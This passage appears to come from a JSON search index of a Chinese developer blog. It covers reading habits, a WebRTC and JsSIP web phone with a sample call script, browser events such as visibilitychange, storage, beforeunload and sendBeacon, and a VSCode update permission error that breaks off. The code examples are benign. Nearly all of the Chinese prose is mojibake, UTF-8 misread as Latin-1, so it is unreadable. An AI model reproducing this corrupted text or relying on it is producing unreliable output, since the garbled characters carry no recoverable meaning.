ç‰ˆï¼Œæˆ‘çœ‹äº†å‡ å¤©ï¼Œè™½ç„¶è¯»ä¹¦çš„è¿›åº¦å¾ˆæ…¢ï¼Œä½†æ˜¯æˆ‘å¾ˆå®¹æ˜“æœ‰æ»¡è¶³æ„Ÿï¼Œå› ä¸ºè¿™ä¸ªç›®æ ‡æ˜¯å¾ˆå®¹æ˜“å°±è¾¾æˆçš„ã€‚å› ä¸ºä½ éšä¾¿å»ä¸Šä¸ªå•æ‰€ï¼Œçœ‹ä¸ª10é¡µç”µå­ä¹¦ä¹Ÿæ˜¯ç»°ç»°æœ‰ä½™çš„ã€‚ä½†æ˜¯è¿™ä¸ªç‰ˆæœ¬ä¹Ÿæœ‰ä¸ªé—®é¢˜ã€‚\nå¦‚æœæˆ‘ä»Šå¤©çœ‹çš„è¿™æœ¬ä¹¦çœ‹çš„æµè¿å¿˜è¿”ï¼Œä¸€ä¸å°å¿ƒå¿˜è®°çœ‹é¡µç äº†ï¼Œå±…ç„¶ä¸çŸ¥ä¸è§‰è¯»äº†38é¡µï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯å·²ç»æ¶ˆè€—äº†æœªæ¥å‡ å¤©çš„é˜…è¯»é‡å‘¢ï¼Œæ˜å¤©è¿™æœ¬ä¹¦è¦ä¸è¦åº¦å‘¢ï¼Ÿ æ‰€ä»¥ï¼Œæˆ‘è¦å‡çº§æˆ‘çš„è¯»ä¹¦æ–¹æ³•ã€‚\nè¯»ä¹¦æ–¹æ³•v1.0.2ç‰ˆï¼š\næ¯å¤©è‡³å°‘è¯»ä¸‰æœ¬ä¹¦ æ¯æœ¬ä¹¦è‡³å°‘è¯»10é¡µ æˆ‘æŒ‰ç…§è¿™ä¸ªæ–¹æ³•ï¼Œæ„Ÿè§‰åšçš„ä¸é”™ã€‚æ¯å¤©éƒ½æœ‰ä¸€å®šçš„é˜…è¯»é‡è¦çœ‹ï¼Œè€Œä¸”é˜…è¯»é‡ä¸æ˜¯å¾ˆå¤§ï¼Œä¸ä¼šè®©æˆ‘è§‰å¾—å¾ˆç´¯ã€‚è€Œä¸”å½“æˆ‘å®Œæˆäº†è¿™ä¸ªç›®æ ‡ï¼Œæˆ‘æ˜¯ä¼šè·å¾—ä¸å°çš„æ»¡è¶³æ„Ÿã€‚\nå¤§ç›®æ ‡åˆ†è§£æˆå°ç›®æ ‡å»é€ä¸ªå‡»ç ´ï¼Œè¿™æ˜¯æˆ‘è¿™ç¯‡æ–‡ç« çš„æ ¸å¿ƒè§‚ç‚¹ã€‚\nå†²é‡å…¬å¼ I = F x T å†²é‡æ˜¯åŠ›çš„æ—¶é—´ç´¯ç§¯æ•ˆåº”çš„é‡åº¦ï¼Œæ˜¯çŸ¢é‡ã€‚å¦‚æœç‰©ä½“æ‰€å—çš„åŠ›æ˜¯å¤§å°å’Œæ–¹å‘éƒ½ä¸å˜çš„æ’åŠ›Fï¼Œå†²é‡Iå°±æ˜¯Få’Œä½œç”¨æ—¶é—´tçš„ä¹˜ç§¯ã€‚ å†²é‡æ˜¯æè¿°åŠ›å¯¹ç‰©ä½“ä½œç”¨çš„æ—¶é—´ç´¯ç§¯æ•ˆåº”çš„ç‰©ç†é‡ã€‚åŠ›çš„å†²é‡æ˜¯ä¸€ä¸ªè¿‡ç¨‹é‡ã€‚åœ¨è°ˆåŠå†²é‡æ—¶ï¼Œå¿…é¡»æ˜ç¡®æ˜¯å“ªä¸ªåŠ›åœ¨å“ªæ®µæ—¶é—´ä¸Šçš„å†²é‡ã€‚\nä¸ªäººå¥½ä¹ æƒ¯çš„å…»æˆï¼Œä¸æ˜¯ä¸€è¹´è€Œå°±çš„ï¼Œè€Œæ˜¯ç±»ä¼¼äºç‰©ç†å­¦å†²é‡çš„æ¦‚å¿µï¼šåŠ›åœ¨ä¸€æ®µæ—¶é—´å†…çš„ç´¯ç§¯ï¼Œæ˜¯è¿‡ç¨‹é‡\nä¸‰åˆ†é’Ÿçš„çƒ­åº¦å¯¹åº”çš„å†²é‡ï¼šI = F_max x T_minã€‚ä½¿ç”¨å¾ˆå¤§çš„åŠ›ï¼Œä½œç”¨æ—¶é—´è¶…çŸ­ï¼ŒåŸºæœ¬ä¸Šæ²¡å•¥æ•ˆæœï¼Œå†²é‡è¶‹è¿‘äºé›¶ã€‚\nå¾®ä¹ æƒ¯å¯¹åº”çš„å†²é‡ï¼šI = F_min x T_maxã€‚ä½¿ç”¨å¾ˆå°çš„åŠ›ï¼Œåšé•¿æ—¶é—´çš„ç§¯ç´¯ã€‚å†²é‡ä¸ä¼šè¶‹è¿‘äºé›¶ï¼Œè€Œæ˜¯ä¼šæ…¢æ…¢å¢é•¿ï¼Œç„¶åè¶‹è¿‘äºä¸€ä¸ªç¨³å®šæ°´å¹³ã€‚æ¯”å¦‚ä½ ç»™è‡ªå·±è§„å®šæ¯å¤©çœ‹1é¡µä¹¦ï¼Œä½†æ˜¯å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¦‚æœä½ åšäº†çœ‹ä¹¦çš„åŠ¨ä½œï¼ŒåŸºæœ¬ä¸Šä½ çœ‹ä¹¦çš„é¡µæ•°ä¸€å®šä¼šå¤§äº1é¡µã€‚\nçœ‹ä»€ä¹ˆæ ·çš„ä¹¦ æˆ‘è‡ªå·±å–œæ¬¢çœ‹è®¡ç®—æœºï¼Œå¿ƒç†å­¦ï¼Œå†å²äººæ–‡æ–¹é¢çš„å‡ºç‰ˆä¹¦ç±ã€‚è€Œæˆ‘çš„é€‰æ‹©æ ‡å‡†æœ‰ä¸¤ä¸ªï¼Œç¬¦åˆä»»ä¸€ä¸€ä¸ªï¼Œæˆ‘éƒ½ä¼šå»çœ‹ã€‚\nè¦æœ‰ç”¨ã€‚æ— è®ºæ˜¯å¯¹æˆ‘çš„ä¸“ä¸šçŸ¥è¯†ï¼Œè¿˜æ˜¯å¯¹äººé™…äº¤å¾€ï¼Œé‡‘èç†è´¢ç­‰æ–¹é¢è¦ç”¨æœ‰ç›Šä¹‹å¤„ è¦æœ‰è¶£ã€‚æ²¡è¶£çš„ä¹¦æˆ‘æ˜¯æ–­ç„¶ä¸ä¼šå»çœ‹çš„ã€‚ è¯»ä¹¦å®é™…ä¸Šæ˜¯è¯»äººï¼Œä¸€æµä½œå®¶å†™çš„ä¸€æµçš„ä¹¦ï¼Œä¸‰æµä½œå®¶åªèƒ½å†™å‡ºä¹æµçš„ä¹¦ã€‚","title":"small is better than big æˆ‘çš„è¯»ä¹¦æ–¹æ³•è®º"},{"content":"0 é˜…å‰é¡»çŸ¥ æœ¬æ–‡å¹¶ä¸æ˜¯æ•™ç¨‹ï¼Œåªæ˜¯å®ç°æ–¹æ¡ˆ æˆ‘åªæ˜¯ä»WEBç«¯è€ƒè™‘è¿™ä¸ªé—®é¢˜ï¼Œå®é™…è¿˜éœ€è¦åç«¯sipæœåŠ¡å™¨çš„é…åˆ jsSIPæœ‰ä¸ªéå¸¸ä¸é”™çš„åœ¨çº¿demo, å¯ä»¥å»å“ªé‡Œç©è€ï¼Œå¾ˆå¥½ç©å‘¢ try jssip 1. æŠ€æœ¯ç®€ä»‹ WebRTC: WebRTCï¼Œåç§°æºè‡ªç½‘é¡µå³æ—¶é€šä¿¡ï¼ˆè‹±è¯­ï¼šWeb Real-Time Communicationï¼‰çš„ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ªæ”¯æŒç½‘é¡µæµè§ˆå™¨è¿›è¡Œå®æ—¶è¯­éŸ³å¯¹è¯æˆ–è§†é¢‘å¯¹è¯çš„APIã€‚å®ƒäº2011å¹´6æœˆ1æ—¥å¼€æºå¹¶åœ¨Googleã€Mozillaã€Operaæ”¯æŒä¸‹è¢«çº³å…¥ä¸‡ç»´ç½‘è”ç›Ÿçš„W3Cæ¨èæ ‡å‡† SIP: ä¼šè¯å‘èµ·åè®®ï¼ˆSession Initiation Protocolï¼Œç¼©å†™SIPï¼‰æ˜¯ä¸€ä¸ªç”±IETF MMUSICå·¥ä½œç»„å¼€å‘çš„åè®®ï¼Œä½œä¸ºæ ‡å‡†è¢«æè®®ç”¨äºåˆ›å»ºï¼Œä¿®æ”¹å’Œç»ˆæ­¢åŒ…æ‹¬è§†é¢‘ï¼Œè¯­éŸ³ï¼Œå³æ—¶é€šä¿¡ï¼Œåœ¨çº¿æ¸¸æˆå’Œè™šæ‹Ÿç°å®ç­‰å¤šç§å¤šåª’ä½“å…ƒç´ åœ¨å†…çš„äº¤äº’å¼ç”¨æˆ·ä¼šè¯ã€‚2000å¹´11æœˆï¼ŒSIPè¢«æ­£å¼æ‰¹å‡†æˆä¸º3GPPä¿¡å·åè®®ä¹‹ä¸€ï¼Œå¹¶æˆä¸ºIMSä½“ç³»ç»“æ„çš„ä¸€ä¸ªæ°¸ä¹…å•å…ƒã€‚SIPä¸H.323ä¸€æ ·ï¼Œæ˜¯ç”¨äºVoIPæœ€ä¸»è¦çš„ä¿¡ä»¤åè®®ä¹‹ä¸€ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œè¦ä¹ˆä½¿ç”¨å®ä½“è¯æœºï¼Œè¦ä¹ˆåœ¨ç³»ç»Ÿä¸Šå®‰è£…åŸºäºsipçš„å®¢æˆ·ç«¯ç¨‹åºã€‚å®ä½“è¯æœºç¡¬ä»¶æˆæœ¬é«˜ï¼ŒåŸºäºsipçš„å®¢æˆ·ç«¯å¾€å¾€å…¼å®¹æ€§å·®ï¼Œæ— æ³•è·¨å¹³å°ï¼Œæ˜“è¢«æ€æ¯’è½¯ä»¶æŸ¥æ€ã€‚\nè€ŒWebRTCæˆ–è®¸æ˜¯æ›´å¥½çš„è§£å†³æ–¹æ¡ˆï¼Œåªè¦ä¸€ä¸ªæµè§ˆå™¨å°±å¯ä»¥å®æ—¶è¯­éŸ³è§†é¢‘é€šè¯ï¼Œè¿™æ˜¯å¾ˆä¸é”™çš„è§£å†³æ–¹æ¡ˆã€‚WebSocketå¯ä»¥ç”¨æ¥ä¼ é€’sipä¿¡ä»¤ï¼Œè€ŒWebRTCç”¨æ¥å®æ—¶ä¼ è¾“è¯­éŸ³è§†é¢‘æµã€‚\n2. å‰ç«¯WebRTCå®ç°æ–¹æ¡ˆ å…¶å®æˆ‘ä»¬ä¸éœ€è¦å»è‡ªå·±å¤„ç†WebRTCçš„ç›¸å…³æ–¹æ³•ï¼Œæˆ–è€…å»å¤„ç†è§†é¢‘æˆ–è€…åª’ä½“æµã€‚å¸‚é¢ä¸Šå·²ç»æœ‰ä¸é”™çš„æ¨¡å—å¯ä¾›é€‰æ‹©ã€‚\n2.1 jsSIP jsSIPæ˜¯JavaScript SIP åº“\nåŠŸèƒ½ç‰¹ç‚¹å¦‚ä¸‹ï¼š\nå¯ä»¥åœ¨æµè§ˆå™¨æˆ–è€…Nodejsä¸­è¿è¡Œ ä½¿ç”¨WebSocketä¼ é€’SIPåè®® è§†é¢‘éŸ³é¢‘å®æ—¶æ¶ˆæ¯ä½¿ç”¨WebRTC éå¸¸è½»é‡ 100%çº¯JavaScript ä½¿ç”¨ç®€å•å¹¶ä¸”å…·æœ‰å¼ºå¤§çš„Api æœåŠ¡ç«¯æ”¯æŒ OverSIP, Kamailio, Asterisk, OfficeSIPï¼ŒreSIProcateï¼ŒFrafos ABC SBCï¼ŒTekSIP æ˜¯RFC 7118 and OverSIPçš„ä½œè€…å†™çš„ ä¸‹é¢æ˜¯ä½¿ç”¨JsSIPæ‰“ç”µè¯çš„ä¾‹å­ï¼Œéå¸¸ç®€å•å§\n// Create our JsSIP instance and run it: var socket = new JsSIP.WebSocketInterface(\u0026#39;wss://sip.myhost.com\u0026#39;); var configuration = { sockets : [ socket ], uri : \u0026#39;sip:alice@example.com\u0026#39;, password : \u0026#39;superpassword\u0026#39; }; var ua = new JsSIP.UA(configuration); ua.start(); // Register callbacks to desired call events var eventHandlers = { \u0026#39;progress\u0026#39;: function(e) { console.log(\u0026#39;call is in progress\u0026#39;); }, \u0026#39;failed\u0026#39;: function(e) { console.log(\u0026#39;call failed with cause: \u0026#39;+ e.data.cause); }, \u0026#39;ended\u0026#39;: function(e) { console.log(\u0026#39;call ended with cause: \u0026#39;+ e.data.cause); }, \u0026#39;confirmed\u0026#39;: function(e) { console.log(\u0026#39;call confirmed\u0026#39;); } }; var options = { \u0026#39;eventHandlers\u0026#39; : eventHandlers, \u0026#39;mediaConstraints\u0026#39; : { \u0026#39;audio\u0026#39;: true, \u0026#39;video\u0026#39;: true } }; var session = ua.call(\u0026#39;sip:bob@example.com\u0026#39;, options); 2.2 SIP.js sip.jsé¡¹ç›®å®é™…æ˜¯forkè‡ªjsSIPçš„ï¼Œè¿™é‡Œä¸»è¦ä»‹ç»å®ƒçš„æœåŠ¡ç«¯æ”¯æŒæƒ…å†µã€‚å…¶ä»–æ¥å£è‡ªå·±è‡ªè¡ŒæŸ¥é˜…\nFreeSWITCH Asterisk OnSIP FreeSWITCH Legacy 3. å¹³å°è€ƒé‡ ç”±äºWebRTCå¯¹æµè§ˆå™¨æœ‰è¾ƒé«˜çš„è¦æ±‚ï¼Œä½ å¯ä»¥çœ‹çœ‹ä¸‹å›¾ï¼Œå“ªäº›æµè§ˆå™¨æ”¯æŒWebRTC, æ‰€æœ‰IEæµè§ˆå™¨éƒ½ä¸è¡Œï¼Œchromeç³»æ”¯æŒæƒ…å†µä¸é”™ã€‚\n3.1 è€ƒé‡æ ‡å‡† è·¨å¹³å° å…¼å®¹æ€§ ä½“ç§¯ é›†æˆæ€§ ç¡¬ä»¶è¦æ±‚ å¼€å‘æˆæœ¬ 3.2 è€ƒé‡è¡¨æ ¼ ç§ç±» é€‚ç”¨å¹³å° ä¼˜ç‚¹ ç¼ºç‚¹ åŸºäºelectronå¼€å‘çš„æ¡Œé¢å®¢æˆ·ç«¯ window, mac, linux è·¨å¹³å°ï¼Œå…¼å®¹å¥½ è¦ä¸‹è½½å®‰è£…ï¼Œä½“ç§¯å¤§ï¼ˆå‹ç¼©åè‡³å°‘48MBï¼‰ï¼Œå¯¹ç”µè„‘æ€§èƒ½æœ‰è¦æ±‚ å¼€å‘js sdk ç°ä»£æµè§ˆå™¨ ä½“ç§¯å°ï¼Œå®¹æ˜“ç¬¬ä¸‰æ–¹é›†æˆ å…¼å®¹å·®(å› ä¸ºæ¶‰åŠåˆ°webRTC, IE11ä»¥åŠä»¥éƒ½ä¸è¡Œï¼Œå¯¹å®¿ä¸»ç¯å¢ƒè¦æ±‚é«˜)ï¼Œå®¢æˆ·é›†æˆéœ€è¦å¼€å‘é‡ å¼€å‘è°·æ­Œæµè§ˆå™¨æ‰©å±• è°·æ­Œæµè§ˆå™¨ ä½“ç§¯å° å…¼å®¹å·®ï¼ˆä»…é™ç±»chromeæµè§ˆå™¨ï¼‰ 4 å‚è€ƒæ–‡æ¡£ and å»¶ä¼¸é˜…è¯» and åŠ¨æ‰‹å®è·µ Js SIP Getting Started 120è¡Œä»£ç å®ç° æµè§ˆå™¨WebRTCè§†é¢‘èŠå¤© SIPåè®®çŠ¶æ€ç ï¼š 5 å¸¸è§é—®é¢˜ 422: \u0026ldquo;Session Interval Too Small\u0026rdquo; jsSIPé»˜è®¤æºå¸¦Session-Expires: 90çš„å¤´éƒ¨ä¿¡æ¯ï¼Œå¦‚æœè¿™ä¸ªè¶…æ—¶å­—æ®µå°äºæœåŠ¡ç«¯çš„è®¾å®šå€¼ï¼Œé‚£ä¹ˆå°±ä¼šå¾—åˆ°å¦‚ä¸‹422çš„å“åº”ã€‚å‚è§SIPåè®®çŠ¶æ€ç ï¼š, å¯ä»¥åœ¨callè¯·æ±‚ä¸­è®¾ç½®sessionTimersExpires, ä½¿å…¶è¶…è¿‡æœåŠ¡ç«¯çš„è®¾å®šå€¼å³å¯\ncall(targer, options ) option.sessionTimersExpires Number (in seconds) for the default Session Timers interval (default value is 90, do not set a lower value). 6 æœ€åï¼Œä½ æˆ‘å…±å‹‰ ","permalink":"https://wdd.js.org/posts/2018/02/webrtc-web-sip-phone/","summary":"0 é˜…å‰é¡»çŸ¥ æœ¬æ–‡å¹¶ä¸æ˜¯æ•™ç¨‹ï¼Œåªæ˜¯å®ç°æ–¹æ¡ˆ æˆ‘åªæ˜¯ä»WEBç«¯è€ƒè™‘è¿™ä¸ªé—®é¢˜ï¼Œå®é™…è¿˜éœ€è¦åç«¯sipæœåŠ¡å™¨çš„é…åˆ jsSIPæœ‰ä¸ªéå¸¸ä¸é”™çš„åœ¨çº¿demo, å¯ä»¥å»å“ªé‡Œç©è€ï¼Œå¾ˆå¥½ç©å‘¢ try jssip 1. æŠ€æœ¯ç®€ä»‹ WebRTC: WebRTCï¼Œåç§°æºè‡ªç½‘é¡µå³æ—¶é€šä¿¡ï¼ˆè‹±è¯­ï¼šWeb Real-Time Communicationï¼‰çš„ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ªæ”¯æŒç½‘é¡µæµè§ˆå™¨è¿›è¡Œå®æ—¶è¯­éŸ³å¯¹è¯æˆ–è§†é¢‘å¯¹è¯çš„APIã€‚å®ƒäº2011å¹´6æœˆ1æ—¥å¼€æºå¹¶åœ¨Googleã€Mozillaã€Operaæ”¯æŒä¸‹è¢«çº³å…¥ä¸‡ç»´ç½‘è”ç›Ÿçš„W3Cæ¨èæ ‡å‡† SIP: ä¼šè¯å‘èµ·åè®®ï¼ˆSession Initiation Protocolï¼Œç¼©å†™SIPï¼‰æ˜¯ä¸€ä¸ªç”±IETF MMUSICå·¥ä½œç»„å¼€å‘çš„åè®®ï¼Œä½œä¸ºæ ‡å‡†è¢«æè®®ç”¨äºåˆ›å»ºï¼Œä¿®æ”¹å’Œç»ˆæ­¢åŒ…æ‹¬è§†é¢‘ï¼Œè¯­éŸ³ï¼Œå³æ—¶é€šä¿¡ï¼Œåœ¨çº¿æ¸¸æˆå’Œè™šæ‹Ÿç°å®ç­‰å¤šç§å¤šåª’ä½“å…ƒç´ åœ¨å†…çš„äº¤äº’å¼ç”¨æˆ·ä¼šè¯ã€‚2000å¹´11æœˆï¼ŒSIPè¢«æ­£å¼æ‰¹å‡†æˆä¸º3GPPä¿¡å·åè®®ä¹‹ä¸€ï¼Œå¹¶æˆä¸ºIMSä½“ç³»ç»“æ„çš„ä¸€ä¸ªæ°¸ä¹…å•å…ƒã€‚SIPä¸H.323ä¸€æ ·ï¼Œæ˜¯ç”¨äºVoIPæœ€ä¸»è¦çš„ä¿¡ä»¤åè®®ä¹‹ä¸€ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œè¦ä¹ˆä½¿ç”¨å®ä½“è¯æœºï¼Œè¦ä¹ˆåœ¨ç³»ç»Ÿä¸Šå®‰è£…åŸºäºsipçš„å®¢æˆ·ç«¯ç¨‹åºã€‚å®ä½“è¯æœºç¡¬ä»¶æˆæœ¬é«˜ï¼ŒåŸºäºsipçš„å®¢æˆ·ç«¯å¾€å¾€å…¼å®¹æ€§å·®ï¼Œæ— æ³•è·¨å¹³å°ï¼Œæ˜“è¢«æ€æ¯’è½¯ä»¶æŸ¥æ€ã€‚\nè€ŒWebRTCæˆ–è®¸æ˜¯æ›´å¥½çš„è§£å†³æ–¹æ¡ˆï¼Œåªè¦ä¸€ä¸ªæµè§ˆå™¨å°±å¯ä»¥å®æ—¶è¯­éŸ³è§†é¢‘é€šè¯ï¼Œè¿™æ˜¯å¾ˆä¸é”™çš„è§£å†³æ–¹æ¡ˆã€‚WebSocketå¯ä»¥ç”¨æ¥ä¼ é€’sipä¿¡ä»¤ï¼Œè€ŒWebRTCç”¨æ¥å®æ—¶ä¼ è¾“è¯­éŸ³è§†é¢‘æµã€‚\n2. å‰ç«¯WebRTCå®ç°æ–¹æ¡ˆ å…¶å®æˆ‘ä»¬ä¸éœ€è¦å»è‡ªå·±å¤„ç†WebRTCçš„ç›¸å…³æ–¹æ³•ï¼Œæˆ–è€…å»å¤„ç†è§†é¢‘æˆ–è€…åª’ä½“æµã€‚å¸‚é¢ä¸Šå·²ç»æœ‰ä¸é”™çš„æ¨¡å—å¯ä¾›é€‰æ‹©ã€‚\n2.1 jsSIP jsSIPæ˜¯JavaScript SIP åº“\nåŠŸèƒ½ç‰¹ç‚¹å¦‚ä¸‹ï¼š\nå¯ä»¥åœ¨æµè§ˆå™¨æˆ–è€…Nodejsä¸­è¿è¡Œ ä½¿ç”¨WebSocketä¼ é€’SIPåè®® è§†é¢‘éŸ³é¢‘å®æ—¶æ¶ˆæ¯ä½¿ç”¨WebRTC éå¸¸è½»é‡ 100%çº¯JavaScript ä½¿ç”¨ç®€å•å¹¶ä¸”å…·æœ‰å¼ºå¤§çš„Api æœåŠ¡ç«¯æ”¯æŒ OverSIP, Kamailio, Asterisk, OfficeSIPï¼ŒreSIProcateï¼ŒFrafos ABC SBCï¼ŒTekSIP æ˜¯RFC 7118 and OverSIPçš„ä½œè€…å†™çš„ ä¸‹é¢æ˜¯ä½¿ç”¨JsSIPæ‰“ç”µè¯çš„ä¾‹å­ï¼Œéå¸¸ç®€å•å§\n// Create our JsSIP instance and run it: var socket = new JsSIP.WebSocketInterface(\u0026#39;wss://sip.myhost.com\u0026#39;); var configuration = { sockets : [ socket ], uri : \u0026#39;sip:alice@example.","title":"åŸºäº WebRTC æ„å»º Web SIP Phone"},{"content":"1 visibilitychangeäº‹ä»¶ è§¦å‘æ¡ä»¶ï¼šæµè§ˆå™¨æ ‡ç­¾é¡µè¢«éšè—æˆ–æ˜¾ç¤ºçš„æ—¶å€™ä¼šè§¦å‘visibilitychangeäº‹ä»¶.\nä½¿ç”¨åœºæ™¯ï¼šå½“æ ‡ç­¾é¡µæ˜¾ç¤ºæˆ–è€…éšè—æ—¶ï¼Œè§¦å‘ä¸€äº›ä¸šåŠ¡é€»è¾‘\ndocument.addEventListener(\u0026#34;visibilitychange\u0026#34;, function() { console.log( document.visibilityState ); }); 2 storageäº‹ä»¶ è§¦å‘æ¡ä»¶ï¼šä½¿ç”¨localStorage or sessionStorageå­˜å‚¨æˆ–è€…ä¿®æ”¹æŸä¸ªæœ¬åœ°å­˜å‚¨æ—¶\nä½¿ç”¨åœºæ™¯ï¼šæ ‡ç­¾é¡µé—´é€šä¿¡\n// ABé¡µé¢åŒæº // åœ¨A é¡µé¢ window.addEventListener(\u0026#39;storage\u0026#39;, (e) =\u0026gt; {console.log(e)}) // åœ¨B é¡µé¢ï¼Œå‘120æ‰“ä¸ªç”µè¯ localStorage.setItem(\u0026#39;makeCall\u0026#39;,\u0026#39;120\u0026#39;) // ç„¶åå¯ä»¥åœ¨Aé¡µé¢é—´æœ‰è¾“å‡º, å¯ä»¥çœ‹å‡ºAé¡µé¢ æ”¶åˆ°äº†Bé¡µé¢çš„é€šçŸ¥ ...key: \u0026#34;makeCall\u0026#34;, oldValue: \u0026#34;119\u0026#34;, newValue: \u0026#34;120\u0026#34;, ... 3 beforeunloadäº‹ä»¶ è§¦å‘æ¡ä»¶ï¼šå½“é¡µé¢çš„èµ„æºå°†è¦å¸è½½(åŠåˆ·æ–°æˆ–è€…å…³é—­æ ‡ç­¾é¡µå‰). å½“é¡µé¢ä¾ç„¶å¯è§ï¼Œå¹¶ä¸”è¯¥äº‹ä»¶å¯ä»¥è¢«å–æ¶ˆåªæ—¶\nä½¿ç”¨åœºæ™¯ï¼šå…³é—­æˆ–è€…åˆ·æ–°é¡µé¢æ—¶å¼¹çª—ç¡®è®¤ï¼Œå…³é—­é¡µé¢æ—¶å‘åç«¯å‘é€æŠ¥å‘Šç­‰\nwindow.addEventListener(\u0026#34;beforeunload\u0026#34;, function (e) { var confirmationMessage = \u0026#34;\\o/\u0026#34;; e.returnValue = confirmationMessage; // Gecko, Trident, Chrome 34+ return confirmationMessage; // Gecko, WebKit, Chrome \u0026lt;34 }); 4 navigator.sendBeacon è¿™ä¸ªæ–¹æ³•ä¸»è¦ç”¨äºæ»¡è¶³ ç»Ÿè®¡å’Œè¯Šæ–­ä»£ç  çš„éœ€è¦ï¼Œè¿™äº›ä»£ç é€šå¸¸å°è¯•åœ¨å¸è½½ï¼ˆunloadï¼‰æ–‡æ¡£ä¹‹å‰å‘webæœåŠ¡å™¨å‘é€æ•°æ®ã€‚è¿‡æ—©çš„å‘é€æ•°æ®å¯èƒ½å¯¼è‡´é”™è¿‡æ”¶é›†æ•°æ®çš„æœºä¼šã€‚ç„¶è€Œï¼Œ å¯¹äºå¼€å‘è€…æ¥è¯´ä¿è¯åœ¨æ–‡æ¡£å¸è½½æœŸé—´å‘é€æ•°æ®ä¸€ç›´æ˜¯ä¸€ä¸ªå›°éš¾ã€‚å› ä¸ºç”¨æˆ·ä»£ç†é€šå¸¸ä¼šå¿½ç•¥åœ¨å¸è½½äº‹ä»¶å¤„ç†å™¨ä¸­äº§ç”Ÿçš„å¼‚æ­¥ XMLHttpRequest ã€‚\nä½¿ç”¨ sendBeacon() æ–¹æ³•ï¼Œå°†ä¼šä½¿ç”¨æˆ·ä»£ç†åœ¨æœ‰æœºä¼šæ—¶å¼‚æ­¥åœ°å‘æœåŠ¡å™¨å‘é€æ•°æ®ï¼ŒåŒæ—¶ä¸ä¼šå»¶è¿Ÿé¡µé¢çš„å¸è½½æˆ–å½±å“ä¸‹ä¸€å¯¼èˆªçš„è½½å…¥æ€§èƒ½ã€‚è¿™å°±è§£å†³äº†æäº¤åˆ†ææ•°æ®æ—¶çš„æ‰€æœ‰çš„é—®é¢˜ï¼šä½¿å®ƒå¯é ï¼Œå¼‚æ­¥å¹¶ä¸”ä¸ä¼šå½±å“ä¸‹ä¸€é¡µé¢çš„åŠ è½½ã€‚æ­¤å¤–ï¼Œä»£ç å®é™…ä¸Šè¿˜è¦æ¯”å…¶ä»–æŠ€æœ¯ç®€å•ï¼\næ³¨æ„ï¼šè¯¥æ–¹æ³•åœ¨IEå’Œsafariæ²¡æœ‰å®ç°\nä½¿ç”¨åœºæ™¯ï¼šå‘é€å´©æºƒæŠ¥å‘Š\nwindow.addEventListener(\u0026#39;unload\u0026#39;, logData, false); function logData() { navigator.sendBeacon(\u0026#34;/log\u0026#34;, analyticsData); } ","permalink":"https://wdd.js.org/posts/2018/02/useful-browser-events/","summary":"1 visibilitychangeäº‹ä»¶ è§¦å‘æ¡ä»¶ï¼šæµè§ˆå™¨æ ‡ç­¾é¡µè¢«éšè—æˆ–æ˜¾ç¤ºçš„æ—¶å€™ä¼šè§¦å‘visibilitychangeäº‹ä»¶.\nä½¿ç”¨åœºæ™¯ï¼šå½“æ ‡ç­¾é¡µæ˜¾ç¤ºæˆ–è€…éšè—æ—¶ï¼Œè§¦å‘ä¸€äº›ä¸šåŠ¡é€»è¾‘\ndocument.addEventListener(\u0026#34;visibilitychange\u0026#34;, function() { console.log( document.visibilityState ); }); 2 storageäº‹ä»¶ è§¦å‘æ¡ä»¶ï¼šä½¿ç”¨localStorage or sessionStorageå­˜å‚¨æˆ–è€…ä¿®æ”¹æŸä¸ªæœ¬åœ°å­˜å‚¨æ—¶\nä½¿ç”¨åœºæ™¯ï¼šæ ‡ç­¾é¡µé—´é€šä¿¡\n// ABé¡µé¢åŒæº // åœ¨A é¡µé¢ window.addEventListener(\u0026#39;storage\u0026#39;, (e) =\u0026gt; {console.log(e)}) // åœ¨B é¡µé¢ï¼Œå‘120æ‰“ä¸ªç”µè¯ localStorage.setItem(\u0026#39;makeCall\u0026#39;,\u0026#39;120\u0026#39;) // ç„¶åå¯ä»¥åœ¨Aé¡µé¢é—´æœ‰è¾“å‡º, å¯ä»¥çœ‹å‡ºAé¡µé¢ æ”¶åˆ°äº†Bé¡µé¢çš„é€šçŸ¥ ...key: \u0026#34;makeCall\u0026#34;, oldValue: \u0026#34;119\u0026#34;, newValue: \u0026#34;120\u0026#34;, ... 3 beforeunloadäº‹ä»¶ è§¦å‘æ¡ä»¶ï¼šå½“é¡µé¢çš„èµ„æºå°†è¦å¸è½½(åŠåˆ·æ–°æˆ–è€…å…³é—­æ ‡ç­¾é¡µå‰). å½“é¡µé¢ä¾ç„¶å¯è§ï¼Œå¹¶ä¸”è¯¥äº‹ä»¶å¯ä»¥è¢«å–æ¶ˆåªæ—¶\nä½¿ç”¨åœºæ™¯ï¼šå…³é—­æˆ–è€…åˆ·æ–°é¡µé¢æ—¶å¼¹çª—ç¡®è®¤ï¼Œå…³é—­é¡µé¢æ—¶å‘åç«¯å‘é€æŠ¥å‘Šç­‰\nwindow.addEventListener(\u0026#34;beforeunload\u0026#34;, function (e) { var confirmationMessage = \u0026#34;\\o/\u0026#34;; e.returnValue = confirmationMessage; // Gecko, Trident, Chrome 34+ return confirmationMessage; // Gecko, WebKit, Chrome \u0026lt;34 }); 4 navigator.","title":"ä¸å¸¸ç”¨å´å¾ˆæœ‰å¦™ç”¨çš„äº‹ä»¶åŠæ–¹æ³•"},{"content":"0. ç°è±¡ Could not create temporary directory: Permission denied\n1. é—®é¢˜èµ·å›  åœ¨ /Users/username/Library/Caches/ç›®å½•ä¸‹ï¼Œæœ‰ä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶ï¼Œ å¯ä»¥çœ‹åˆ°ï¼Œä»–ä»¬ä¸¤ä¸ªçš„ç”¨æˆ·æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸€ä¸ªæ˜¯rootä¸€ä¸ªusername, ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘æ˜¯ä»¥usernameæ¥ä½¿ç”¨æˆ‘çš„macçš„ã€‚å°±æ˜¯å› ä¸ºè¿™ä¸¤ä¸ªæ–‡ä»¶çš„ç”¨æˆ·ä¸ä¸€æ ·ï¼Œå¯¼è‡´äº†æ›´æ–°å¤±è´¥ã€‚\ndrwxr-xr-x 6 username staff 204B Jan 17 20:33 com.microsoft.VSCode drwxr--r-- 2 root staff 68B Dec 17 13:51 